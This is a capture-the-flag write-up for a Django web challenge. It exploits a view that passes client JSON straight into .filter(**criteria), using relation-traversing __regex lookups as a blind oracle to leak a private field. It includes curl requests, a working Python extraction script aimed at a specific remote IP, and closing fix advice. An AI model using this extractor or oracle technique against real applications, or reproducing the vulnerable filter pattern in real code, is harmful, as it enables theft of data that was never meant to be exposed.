# Noticeboard — web (50 pts)

**Category:** web
**Stack:** Django (sqlite backend)
**Given files:** Django project source (`dist/`) — `notices/views.py`, `notices/models.py`, `notices/management/commands/seed_board.py`, `config/settings.py`, `config/urls.py`

> Flavor text: *"The city maintains a notice board for local service updates."*

## 1. Recon

The source is a small Django app with a single API endpoint, `/api/notices`, backed by a `Notice` model with (at least) these fields:

- `title`, `body` — public fields
- `is_public` — boolean
- `internal_note` — holds the flag, only ever set on one notice with `is_public=False`
- a `ManyToManyField` to a `Topic` model (`topics`)

The seed command creates a small fixed dataset: a couple of public notices (e.g. **"Evening roadwork"**, **"Garden maintenance"**) and one private notice (**"Service planning draft"**, `is_public=False`) whose `internal_note` holds the flag. Crucially, the private flag notice **shares a `Topic`** (e.g. "Street Services") with the public "Evening roadwork" notice.

## 2. The bug

The view builds the queryset like this:

```python
criteria = request.json()  # whatever the client sends, unvalidated
notices = Notice.objects.filter(is_public=True, **criteria).values("id", "title", "body")
```

The whole `criteria` dict — arbitrary keys and Django **field lookups** — goes straight into `.filter(**criteria)`, with no whitelist of allowed fields or lookup types. This is a classic **Django ORM lookup injection**.

Two things limit the "obvious" attack:
- `is_public=True` is hard-coded as a positional kwarg, and Python won't let you pass the same keyword twice, so you can't directly flip it to `False` via `criteria["is_public"]`.
- The response only ever returns `id`, `title`, `body` via `.values(...)` — `internal_note` is never serialized, even for notices that do match.

So the private notice can neither be *selected* nor have its `internal_note` *returned* directly.

## 3. Turning it into an oracle

Django lookups can **traverse relations**. Because the public and private notices share a `Topic`, a lookup like:

```
topics__notices__internal_note__regex
```

joins from the (public) notice being filtered, through its `topics`, back out to **every notice that shares that topic** — including the private one — and tests `internal_note` against a regex. The outer notice still needs `is_public=True` to appear in the result, but the *condition itself* can reference the private sibling notice's field.

In other words:

> "Is the public notice returned?" becomes a boolean oracle on the private notice's `internal_note`.

```bash
curl -s -X POST http://TARGET/api/notices -H 'Content-Type: application/json' \
  -d '{"topics__notices__internal_note__regex": "^flag\\{"}'
# {"count": 1, "results": [...]}   <- true

curl -s -X POST http://TARGET/api/notices -H 'Content-Type: application/json' \
  -d '{"topics__notices__internal_note__regex": "^zzzz"}'
# {"count": 0, "results": []}      <- false
```

Django's sqlite backend implements the `__regex` / `__iregex` lookup using Python's `re` module under the hood, so this is a **full regex engine**, not just a crude substring match — which makes efficient extraction possible (see next section).

## 4. Exfiltrating the flag

With a working boolean oracle, the flag can be extracted one character at a time:

1. For a known prefix `known`, first check `^known.` to confirm there's at least one more character (this doubles as the "are we done yet" check — the loop stops when this is false, i.e. the trailing `}` has been reached).
2. Binary-search the next character over the candidate alphabet (letters, digits, common symbols) using a regex character class, e.g. `^known[a-m...]` vs `^known[n-z...]` — about **7 requests per character** (`log2(~90)`) instead of brute-forcing the whole alphabet per position.
3. Append the found character and repeat until the string ends in `}`.

```python
import requests, re, string

URL = "http://52.146.88.61:38670/api/notices"
ALPHABET = list(string.ascii_letters + string.digits + "_{}!@#$%^&*()-+=.,:;/\\|<>[]~`'\" ")

def matches(regex):
    r = requests.post(URL, json={"topics__notices__internal_note__regex": regex}, timeout=10)
    return r.json().get("count", 0) > 0

def find_next_char(known):
    prefix = re.escape(known)
    if not matches("^" + prefix + "."):
        return None
    candidates = ALPHABET[:]
    while len(candidates) > 1:
        mid = len(candidates) // 2
        left = candidates[:mid]
        cls = "[" + "".join(re.escape(c) for c in left) + "]"
        candidates = left if matches("^" + prefix + cls) else candidates[mid:]
    return candidates[0]

known = ""
while True:
    c = find_next_char(known)
    if c is None:
        break
    known += c
    if known.endswith("}"):
        break
print(known)
```

The approach was validated against a local copy of the app (Django + sqlite, seeded with a known test flag) before running it against the remote target, to confirm the relation-traversal oracle and the regex lookup both behave as expected.

## 5. Result

Running the extractor against the live instance recovered the flag character-by-character:

```
FLAG: web{related_lookups_leak_private_notices_one_range_at_a_time1794659504cgVupowi152b1b7eef1167ed45bda3cd0b0357508f012ceb_133}
```

(The long hex/numeric tail appears to be a per-instance nonce/timestamp baked into the seeded flag, rather than part of the "meaningful" flag text — consistent with a freshly-seeded instance per challenge connection.)

## 6. Root cause & fix

- **Never pass user-controlled dict directly into `.filter(**kwargs)` (or `.exclude()`, `.order_by()`, etc.)** — Django field lookups are a powerful query language in their own right, and exposing them unfiltered is equivalent to allowing arbitrary `WHERE`-clause construction, including relation traversal into tables/fields the API was never meant to expose.
- A safe version would whitelist both the **fields** and the **lookup types** allowed from user input (e.g. `title__icontains` only), and never allow lookups that cross relations the client shouldn't be able to see (`topics__notices__...`).
- Sensitive fields (`internal_note`) shouldn't be reachable via *any* lookup path from a model that's otherwise exposed to anonymous users, regardless of what gets serialized in the response — as shown here, the field doesn't need to be returned to be exfiltrated; it only needs to be *filterable*.

## 7. Takeaways

- Blind/boolean oracles don't require a dedicated "vulnerable field" — any `ManyToMany`/`ForeignKey` relation shared between a reachable object and a protected one can become a pivot.
- Regex-capable blind oracles are much faster to exploit than substring/equality ones (binary search per character vs. linear alphabet brute force).
- Validating locally against a disposable copy of the exact same stack (same framework, same DB backend) before hitting the live target is worth the setup time — it confirms the technique (and catches backend quirks like whether `__regex` is even supported) without burning the challenge's time limit.
